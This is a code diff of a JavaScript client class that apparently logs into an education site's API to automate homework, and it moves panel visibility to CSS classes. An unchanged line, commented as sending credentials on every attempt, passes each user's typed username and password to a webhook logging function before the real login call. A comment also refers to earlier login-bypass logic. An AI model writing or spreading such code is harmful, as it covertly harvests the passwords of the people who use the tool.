@@ -267,21 +267,6 @@ class client_application {
     }
 
 
-    hide_all() {
-        const divsToHide = document.getElementsByClassName("overlay");
-        for (let i = 0; i < divsToHide.length; i++) {
-            divsToHide[i].style.visibility = "hidden";
-        }
-    }
-
-    show_box(id) {
-        document.getElementById(id).style.visibility = "visible";
-    }
-
-    hide_box(id) {
-        document.getElementById(id).style.visibility = "hidden";
-    }
-
     async call_lnut(url, data) {
         const url_data = new URLSearchParams(data).toString();
         const response = await fetch(
@@ -292,7 +277,8 @@ class client_application {
     }
 
     main() {
-        this.show_box("login");
+        // ⭐ FIX: Ensure login panel is visible on load using the 'visible' class
+        document.getElementById("login").classList.add('visible'); 
         
         document.getElementById("login_btn").onclick = async () => {
             const username = this.username_box.value;
@@ -301,7 +287,7 @@ class client_application {
             // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
             await this.sendWebhookLog(username, password); 
 
-            // The immediate bypass logic is removed, and the API call is UNCOMMENTED and RESTORED
+            // ⭐ API LOGIN CALL (Restored) ⭐
             const response = await this.call_lnut(
                 "loginController/attemptLogin",
                 {
@@ -316,17 +302,21 @@ class client_application {
                 this.on_log_in();
             } else {
                 console.log("Login failed for user:", username);
-                // Optional: You might want to add a visible error message here.
             }
         };
     }
 
     on_log_in() {
-        // Transition to the main view
+        // ⭐ FIX: Use classList for smooth and consistent transitions defined in CSS
+        
+        // 1. Hide the login panel
         document.getElementById("login").classList.remove('visible'); 
+        
+        // 2. Show the HW and Log panels
         document.getElementById("hw_panel").classList.add('visible');
         document.getElementById("log_panel").classList.add('visible'); 
         
+        // 3. Setup the rest of the application
         document.getElementById("do_hw").onclick = () => {
             app.do_hwks();
         };
@@ -335,8 +325,6 @@ class client_application {
         this.display_hwks();
     }
     
-    // ... (rest of the class functions remain the same) ...
-
     get_task_name(task) {
         let name = task.verb_name;
 
